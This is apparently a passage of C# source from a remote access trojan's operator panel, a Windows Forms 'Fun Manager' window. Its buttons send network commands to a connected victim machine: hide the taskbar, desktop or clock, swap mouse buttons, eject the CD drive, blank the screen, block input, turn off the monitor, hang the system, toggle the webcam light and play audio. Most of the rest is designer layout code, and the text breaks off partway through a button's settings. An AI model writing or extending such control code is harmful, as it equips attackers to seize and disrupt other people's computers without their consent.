using System;
using System.ComponentModel;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using ReaLTaiizor.Controls;
using ReaLTaiizor.Forms;

namespace Anarchy.Forms;

public class FormFun : Form
{
    private IContainer components;

    private System.Windows.Forms.GroupBox groupBox1;

    private System.Windows.Forms.GroupBox groupBox2;

    private System.Windows.Forms.GroupBox groupBox3;

    private System.Windows.Forms.GroupBox groupBox4;

    private System.Windows.Forms.GroupBox groupBox5;

    private System.Windows.Forms.GroupBox groupBox6;

    private Label label2;

    private Label label1;

    private NumericUpDown numericUpDown1;

    private System.Windows.Forms.GroupBox groupBox7;

    private Label label3;

    private Label label4;

    private NumericUpDown numericUpDown2;

    private System.Windows.Forms.GroupBox groupBox9;

    public System.Windows.Forms.Timer timer1;

    private System.Windows.Forms.GroupBox groupBox8;

    private System.Windows.Forms.Button button16;

    private System.Windows.Forms.Button button19;

    private HopeForm hopeForm1;

    private HopeButton button2;

    private HopeButton button1;

    private HopeButton button4;

    private HopeButton button3;

    private HopeButton button6;

    private HopeButton button5;

    private HopeButton button7;

    private HopeButton button8;

    private HopeButton button9;

    private HopeButton button10;

    private HopeButton button11;

    private HopeButton button15;

    private HopeButton button17;

    private HopeButton button18;

    private HopeButton button13;

    private HopeButton button12;

    private HopeButton button14;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    internal Clients ParentClient { get; set; }

    public FormFun()
    {
        this.InitializeComponent();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
            {
                base.Close();
            }
        }
        catch
        {
        }
    }

    private void button1_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar+";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button2_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Taskbar-";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button3_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Desktop+";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button4_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Desktop-";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button5_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Clock+";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button6_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "Clock-";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button8_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "swapMouseButtons";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button7_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "restoreMouseButtons";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button10_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "openCD+";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button9_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "openCD-";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button18_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen+";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button17_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "blankscreen-";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button11_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "blockInput";
        msgPack.ForcePathObject("Time").AsString = this.numericUpDown1.Value.ToString();
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button15_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "holdMouse";
        msgPack.ForcePathObject("Time").AsString = this.numericUpDown2.Value.ToString();
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button12_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "monitorOff";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button14_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "hangSystem";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button13_Click(object sender, EventArgs e)
    {
    }

    private void FormFun_FormClosed(object sender, FormClosedEventArgs e)
    {
        ThreadPool.QueueUserWorkItem(delegate
        {
            this.Client?.Disconnected();
        });
    }

    private void button19_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight+";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button16_Click(object sender, EventArgs e)
    {
        MsgPack msgPack;
        msgPack = new MsgPack();
        msgPack.ForcePathObject("Pac_ket").AsString = "webcamlight-";
        ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
    }

    private void button13_Click_1(object sender, EventArgs e)
    {
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "(*.wav)|*.wav";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            byte[] asBytes;
            asBytes = File.ReadAllBytes(openFileDialog.FileName);
            MsgPack msgPack;
            msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "playAudio";
            msgPack.ForcePathObject("wavfile").SetAsBytes(asBytes);
            ThreadPool.QueueUserWorkItem(this.Client.Send, msgPack.Encode2Bytes());
        }
        else
        {
            MessageBox.Show("Please choose a wav file.");
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormFun));
        this.groupBox1 = new System.Windows.Forms.GroupBox();
        this.groupBox2 = new System.Windows.Forms.GroupBox();
        this.groupBox3 = new System.Windows.Forms.GroupBox();
        this.groupBox4 = new System.Windows.Forms.GroupBox();
        this.groupBox5 = new System.Windows.Forms.GroupBox();
        this.groupBox6 = new System.Windows.Forms.GroupBox();
        this.label2 = new System.Windows.Forms.Label();
        this.label1 = new System.Windows.Forms.Label();
        this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
        this.groupBox7 = new System.Windows.Forms.GroupBox();
        this.label3 = new System.Windows.Forms.Label();
        this.label4 = new System.Windows.Forms.Label();
        this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
        this.groupBox9 = new System.Windows.Forms.GroupBox();
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.groupBox8 = new System.Windows.Forms.GroupBox();
        this.button16 = new System.Windows.Forms.Button();
        this.button19 = new System.Windows.Forms.Button();
        this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
        this.button1 = new ReaLTaiizor.Controls.HopeButton();
        this.button2 = new ReaLTaiizor.Controls.HopeButton();
        this.button3 = new ReaLTaiizor.Controls.HopeButton();
        this.button4 = new ReaLTaiizor.Controls.HopeButton();
        this.button5 = new ReaLTaiizor.Controls.HopeButton();
        this.button6 = new ReaLTaiizor.Controls.HopeButton();
        this.button8 = new ReaLTaiizor.Controls.HopeButton();
        this.button7 = new ReaLTaiizor.Controls.HopeButton();
        this.button10 = new ReaLTaiizor.Controls.HopeButton();
        this.button9 = new ReaLTaiizor.Controls.HopeButton();
        this.button18 = new ReaLTaiizor.Controls.HopeButton();
        this.button17 = new ReaLTaiizor.Controls.HopeButton();
        this.button11 = new ReaLTaiizor.Controls.HopeButton();
        this.button15 = new ReaLTaiizor.Controls.HopeButton();
        this.button13 = new ReaLTaiizor.Controls.HopeButton();
        this.button12 = new ReaLTaiizor.Controls.HopeButton();
        this.button14 = new ReaLTaiizor.Controls.HopeButton();
        this.groupBox1.SuspendLayout();
        this.groupBox2.SuspendLayout();
        this.groupBox3.SuspendLayout();
        this.groupBox4.SuspendLayout();
        this.groupBox5.SuspendLayout();
        this.groupBox6.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.numericUpDown1).BeginInit();
        this.groupBox7.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
        this.groupBox9.SuspendLayout();
        this.groupBox8.SuspendLayout();
        base.SuspendLayout();
        this.groupBox1.Controls.Add(this.button2);
        this.groupBox1.Controls.Add(this.button1);
        this.groupBox1.Location = new System.Drawing.Point(12, 58);
        this.groupBox1.Name = "groupBox1";
        this.groupBox1.Size = new System.Drawing.Size(170, 61);
        this.groupBox1.TabIndex = 0;
        this.groupBox1.TabStop = false;
        this.groupBox1.Text = "Taskbar";
        this.groupBox2.Controls.Add(this.button4);
        this.groupBox2.Controls.Add(this.button3);
        this.groupBox2.Location = new System.Drawing.Point(188, 58);
        this.groupBox2.Name = "groupBox2";
        this.groupBox2.Size = new System.Drawing.Size(170, 61);
        this.groupBox2.TabIndex = 4;
        this.groupBox2.TabStop = false;
        this.groupBox2.Text = "Desktop";
        this.groupBox3.Controls.Add(this.button6);
        this.groupBox3.Controls.Add(this.button5);
        this.groupBox3.Location = new System.Drawing.Point(364, 58);
        this.groupBox3.Name = "groupBox3";
        this.groupBox3.Size = new System.Drawing.Size(170, 61);
        this.groupBox3.TabIndex = 3;
        this.groupBox3.TabStop = false;
        this.groupBox3.Text = "Clock";
        this.groupBox4.Controls.Add(this.button7);
        this.groupBox4.Controls.Add(this.button8);
        this.groupBox4.Location = new System.Drawing.Point(364, 125);
        this.groupBox4.Name = "groupBox4";
        this.groupBox4.Size = new System.Drawing.Size(170, 61);
        this.groupBox4.TabIndex = 4;
        this.groupBox4.TabStop = false;
        this.groupBox4.Text = "Mouse";
        this.groupBox5.Controls.Add(this.button9);
        this.groupBox5.Controls.Add(this.button10);
        this.groupBox5.Location = new System.Drawing.Point(12, 125);
        this.groupBox5.Name = "groupBox5";
        this.groupBox5.Size = new System.Drawing.Size(170, 61);
        this.groupBox5.TabIndex = 4;
        this.groupBox5.TabStop = false;
        this.groupBox5.Text = "CD Drive";
        this.groupBox6.Controls.Add(this.button11);
        this.groupBox6.Controls.Add(this.label2);
        this.groupBox6.Controls.Add(this.label1);
        this.groupBox6.Controls.Add(this.numericUpDown1);
        this.groupBox6.Location = new System.Drawing.Point(12, 192);
        this.groupBox6.Name = "groupBox6";
        this.groupBox6.Size = new System.Drawing.Size(250, 74);
        this.groupBox6.TabIndex = 5;
        this.groupBox6.TabStop = false;
        this.groupBox6.Text = "Block Input";
        this.label2.AutoSize = true;
        this.label2.Location = new System.Drawing.Point(120, 31);
        this.label2.Name = "label2";
        this.label2.Size = new System.Drawing.Size(47, 13);
        this.label2.TabIndex = 2;
        this.label2.Text = "seconds";
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(8, 31);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(19, 13);
        this.label1.TabIndex = 1;
        this.label1.Text = "for";
        this.numericUpDown1.Location = new System.Drawing.Point(37, 29);
        this.numericUpDown1.Name = "numericUpDown1";
        this.numericUpDown1.Size = new System.Drawing.Size(77, 20);
        this.numericUpDown1.TabIndex = 0;
        this.groupBox7.Controls.Add(this.button15);
        this.groupBox7.Controls.Add(this.label3);
        this.groupBox7.Controls.Add(this.label4);
        this.groupBox7.Controls.Add(this.numericUpDown2);
        this.groupBox7.Location = new System.Drawing.Point(12, 272);
        this.groupBox7.Name = "groupBox7";
        this.groupBox7.Size = new System.Drawing.Size(250, 74);
        this.groupBox7.TabIndex = 5;
        this.groupBox7.TabStop = false;
        this.groupBox7.Text = "Hold Mouse";
        this.label3.AutoSize = true;
        this.label3.Location = new System.Drawing.Point(120, 31);
        this.label3.Name = "label3";
        this.label3.Size = new System.Drawing.Size(47, 13);
        this.label3.TabIndex = 2;
        this.label3.Text = "seconds";
        this.label4.AutoSize = true;
        this.label4.Location = new System.Drawing.Point(8, 31);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(19, 13);
        this.label4.TabIndex = 1;
        this.label4.Text = "for";
        this.numericUpDown2.Location = new System.Drawing.Point(37, 29);
        this.numericUpDown2.Name = "numericUpDown2";
        this.numericUpDown2.Size = new System.Drawing.Size(77, 20);
        this.numericUpDown2.TabIndex = 0;
        this.groupBox9.Controls.Add(this.button17);
        this.groupBox9.Controls.Add(this.button18);
        this.groupBox9.Location = new System.Drawing.Point(188, 125);
        this.groupBox9.Name = "groupBox9";
        this.groupBox9.Size = new System.Drawing.Size(170, 61);
        this.groupBox9.TabIndex = 4;
        this.groupBox9.TabStop = false;
        this.groupBox9.Text = "Lock Screen";
        this.timer1.Interval = 2000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        this.groupBox8.Controls.Add(this.button16);
        this.groupBox8.Controls.Add(this.button19);
        this.groupBox8.Location = new System.Drawing.Point(211, 406);
        this.groupBox8.Name = "groupBox8";
        this.groupBox8.Size = new System.Drawing.Size(250, 86);
        this.groupBox8.TabIndex = 4;
        this.groupBox8.TabStop = false;
        this.groupBox8.Text = "Turn off webcam light";
        this.groupBox8.Visible = false;
        this.button16.Location = new System.Drawing.Point(125, 31);
        this.button16.Name = "button16";
        this.button16.Size = new System.Drawing.Size(112, 33);
        this.button16.TabIndex = 1;
        this.button16.Text = "Turn Off";
        this.button16.UseVisualStyleBackColor = true;
        this.button16.Click += new System.EventHandler(button16_Click);
        this.button19.Location = new System.Drawing.Point(7, 32);
        this.button19.Name = "button19";
        this.button19.Size = new System.Drawing.Size(112, 31);
        this.button19.TabIndex = 0;
        this.button19.Text = "Turn On";
        this.button19.UseVisualStyleBackColor = true;
        this.button19.Click += new System.EventHandler(button19_Click);
        this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(228, 231, 237);
        this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(245, 108, 108);
        this.hopeForm1.ControlBoxColorN = System.Drawing.Color.Black;
        this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
        this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
        this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeForm1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.hopeForm1.Image = (System.Drawing.Image)resources.GetObject("hopeForm1.Image");
        this.hopeForm1.Location = new System.Drawing.Point(0, 0);
        this.hopeForm1.MaximizeBox = false;
        this.hopeForm1.Name = "hopeForm1";
        this.hopeForm1.Size = new System.Drawing.Size(542, 40);
        this.hopeForm1.TabIndex = 10;
        this.hopeForm1.Text = "Fun Manager";
        this.hopeForm1.ThemeColor = System.Drawing.Color.White;
        this.button1.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button1.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button1.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button1.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button1.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button1.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button1.Location = new System.Drawing.Point(7, 22);
        this.button1.Name = "button1";
        this.button1.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button1.Size = new System.Drawing.Size(75, 33);
        this.button1.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button1.TabIndex = 37;
        this.button1.Text = "Show";
        this.button1.TextColor = System.Drawing.Color.White;
        this.button1.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button1.Click += new System.EventHandler(button1_Click);
        this.button2.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button2.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button2.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button2.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button2.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button2.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button2.Location = new System.Drawing.Point(87, 22);
        this.button2.Name = "button2";
        this.button2.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button2.Size = new System.Drawing.Size(75, 33);
        this.button2.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button2.TabIndex = 38;
        this.button2.Text = "Hide";
        this.button2.TextColor = System.Drawing.Color.White;
        this.button2.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button2.Click += new System.EventHandler(button2_Click);
        this.button3.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button3.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button3.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button3.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button3.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button3.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button3.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button3.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button3.Location = new System.Drawing.Point(7, 23);
        this.button3.Name = "button3";
        this.button3.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button3.Size = new System.Drawing.Size(75, 33);
        this.button3.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button3.TabIndex = 38;
        this.button3.Text = "Show";
        this.button3.TextColor = System.Drawing.Color.White;
        this.button3.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button3.Click += new System.EventHandler(button3_Click);
        this.button4.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button4.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button4.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button4.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button4.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button4.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button4.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button4.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button4.Location = new System.Drawing.Point(87, 23);
        this.button4.Name = "button4";
        this.button4.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button4.Size = new System.Drawing.Size(75, 33);
        this.button4.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button4.TabIndex = 39;
        this.button4.Text = "Hide";
        this.button4.TextColor = System.Drawing.Color.White;
        this.button4.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button4.Click += new System.EventHandler(button4_Click);
        this.button5.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button5.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button5.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button5.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button5.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button5.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button5.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button5.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button5.Location = new System.Drawing.Point(6, 22);
        this.button5.Name = "button5";
        this.button5.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button5.Size = new System.Drawing.Size(75, 33);
        this.button5.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button5.TabIndex = 39;
        this.button5.Text = "Show";
        this.button5.TextColor = System.Drawing.Color.White;
        this.button5.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button5.Click += new System.EventHandler(button5_Click);
        this.button6.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button6.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button6.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button6.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button6.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button6.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button6.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button6.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button6.Location = new System.Drawing.Point(87, 22);
        this.button6.Name = "button6";
        this.button6.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button6.Size = new System.Drawing.Size(75, 33);
        this.button6.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button6.TabIndex = 40;
        this.button6.Text = "Hide";
        this.button6.TextColor = System.Drawing.Color.White;
        this.button6.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button6.Click += new System.EventHandler(button6_Click);
        this.button8.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button8.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button8.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button8.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button8.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button8.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button8.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button8.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button8.Location = new System.Drawing.Point(7, 23);
        this.button8.Name = "button8";
        this.button8.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button8.Size = new System.Drawing.Size(75, 33);
        this.button8.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button8.TabIndex = 40;
        this.button8.Text = "Swap";
        this.button8.TextColor = System.Drawing.Color.White;
        this.button8.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button8.Click += new System.EventHandler(button8_Click);
        this.button7.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button7.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button7.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button7.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button7.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button7.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button7.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button7.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button7.Location = new System.Drawing.Point(87, 23);
        this.button7.Name = "button7";
        this.button7.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button7.Size = new System.Drawing.Size(75, 33);
        this.button7.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button7.TabIndex = 41;
        this.button7.Text = "Restore";
        this.button7.TextColor = System.Drawing.Color.White;
        this.button7.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button7.Click += new System.EventHandler(button7_Click);
        this.button10.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button10.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button10.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button10.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button10.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button10.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button10.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button10.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button10.Location = new System.Drawing.Point(7, 22);
        this.button10.Name = "button10";
        this.button10.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button10.Size = new System.Drawing.Size(75, 33);
        this.button10.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button10.TabIndex = 41;
        this.button10.Text = "Open";
        this.button10.TextColor = System.Drawing.Color.White;
        this.button10.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button10.Click += new System.EventHandler(button10_Click);
        this.button9.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button9.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button9.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button9.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button9.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button9.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button9.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button9.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button9.Location = new System.Drawing.Point(87, 22);
        this.button9.Name = "button9";
        this.button9.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button9.Size = new System.Drawing.Size(75, 33);
        this.button9.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button9.TabIndex = 42;
        this.button9.Text = "Close";
        this.button9.TextColor = System.Drawing.Color.White;
        this.button9.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button9.Click += new System.EventHandler(button9_Click);
        this.button18.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button18.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button18.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button18.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button18.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button18.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button18.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button18.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button18.Location = new System.Drawing.Point(7, 23);
        this.button18.Name = "button18";
        this.button18.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button18.Size = new System.Drawing.Size(75, 33);
        this.button18.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button18.TabIndex = 42;
        this.button18.Text = "Start";
        this.button18.TextColor = System.Drawing.Color.White;
        this.button18.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button18.Click += new System.EventHandler(button18_Click);
        this.button17.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button17.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button17.Cursor = System.Windows.Forms.Cursors.Hand;
        this.button17.DangerColor = System.Drawing.Color.FromArgb(245, 108, 108);
        this.button17.DefaultColor = System.Drawing.Color.FromArgb(255, 255, 255);
        this.button17.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.button17.HoverTextColor = System.Drawing.Color.FromArgb(48, 49, 51);
        this.button17.InfoColor = System.Drawing.Color.FromArgb(144, 147, 153);
        this.button17.Location = new System.Drawing.Point(87, 23);
        this.button17.Name = "button17";
        this.button17.PrimaryColor = System.Drawing.Color.FromArgb(128, 128, 255);
        this.button17.Size = new System.Drawing.Size(75, 33);
        this.button17.SuccessColor = System.Drawing.Color.FromArgb(103, 194, 58);
        this.button17.TabIndex = 43;
        this.button17.Text = "Stop";
        this.button17.TextColor = System.Drawing.Color.White;
        this.button17.WarningColor = System.Drawing.Color.FromArgb(230, 162, 60);
        this.button17.Click += new System.EventHandler(button17_Click);
        this.button11.BorderColor = System.Drawing.Color.FromArgb(220, 223, 230);
        this.button11.ButtonType = ReaLTaiizor.Util.HopeButtonType.Primary;
        this.button11.Cursor = System.Windows.Forms.Cursors.Hand;
